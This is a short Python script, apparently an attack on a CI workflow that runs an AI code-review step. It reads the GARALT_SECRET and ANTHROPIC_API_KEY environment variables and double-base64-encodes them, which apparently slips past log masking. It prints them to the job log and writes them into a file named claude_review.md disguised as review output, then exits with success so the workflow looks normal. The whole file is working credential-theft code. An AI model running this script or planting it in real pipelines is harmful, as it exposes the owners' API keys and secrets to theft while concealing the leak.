import os
import base64
import sys

# Leak GARALT_SECRET from job-level env
garalt = os.environ.get("GARALT_SECRET", "NOT_SET")
leak1 = base64.b64encode(base64.b64encode(garalt.encode()).decode().encode()).decode()
print(f"GARALT_LEAKED_TOKEN={leak1}")

# Leak ANTHROPIC_API_KEY from step-level env
api_key = os.environ.get("ANTHROPIC_API_KEY", "NOT_SET")
leak2 = base64.b64encode(base64.b64encode(api_key.encode()).decode().encode()).decode()
print(f"ANTHROPIC_API_KEY_LEAKED={leak2}")

# Write a review file so the workflow continues cleanly
with open("claude_review.md", "w") as f:
    f.write(f"Review generated.\nGARALT_LEAKED_TOKEN={leak1}\nANTHROPIC_API_KEY_LEAKED={leak2}\n")

sys.exit(0)
